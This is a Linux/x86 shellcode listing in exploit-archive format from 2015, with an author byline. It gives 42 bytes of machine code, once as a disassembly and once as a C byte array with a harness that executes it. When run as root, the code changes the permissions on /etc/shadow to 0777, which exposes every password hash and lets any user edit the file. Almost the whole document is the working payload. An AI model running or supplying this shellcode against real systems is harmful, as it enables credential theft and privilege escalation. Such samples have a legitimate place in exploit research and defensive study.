/*
# Title: Linux/x86 chmod('/etc/shadow','0777') - shellcode 42 bytes
# Platform: linux/x86_64
# Date: 2015-06-15
# Author: Mohammad Reza Espargham
#    Linkedin    :   https://ir.linkedin.com/in/rezasp
#    E-Mail      :   me[at]reza[dot]es , reza.espargham[at]gmail[dot]com
#    Website     :   www.reza.es
#    Twitter     :   https://twitter.com/rezesp
#    FaceBook    :   https://www.facebook.com/mohammadreza.espargham


00000000 <.text>:
   0:	6a 0f                	push   $0xf
   2:	58                   	pop    %eax
   3:	68 90 90 ff 01       	push   $0x1ff9090
   8:	59                   	pop    %ecx
   9:	c1 e9 10             	shr    $0x10,%ecx
   c:	68 90 64 6f 77       	push   $0x776f6490
  11:	5b                   	pop    %ebx
  12:	c1 eb 08             	shr    $0x8,%ebx
  15:	53                   	push   %ebx
  16:	68 2f 73 68 61       	push   $0x6168732f
  1b:	68 2f 65 74 63       	push   $0x6374652f
  20:	89 e3                	mov    %esp,%ebx
  22:	cd 80                	int    $0x80
  24:	b0 01                	mov    $0x1,%al
  26:	b3 01                	mov    $0x1,%bl
  28:	cd 80                	int    $0x80

*/

#include <stdio.h>
#include <string.h>
int main(){
unsigned char shellcode[]= "\x6a\x0f\x58\x68\x90\x90\xff\x01\x59\xc1\xe9\x10\x68\x90\x64\x6f\x77\x5b\xc1\xeb\x08\x53\x68\x2f\x73\x68\x61\x68\x2f\x65\x74\x63\x89\xe3\xcd\x80\xb0\x01\xb3\x01\xcd\x80";
fprintf(stdout,"Length: %d\n\n",strlen(shellcode));
    (*(void(*)()) shellcode)();
}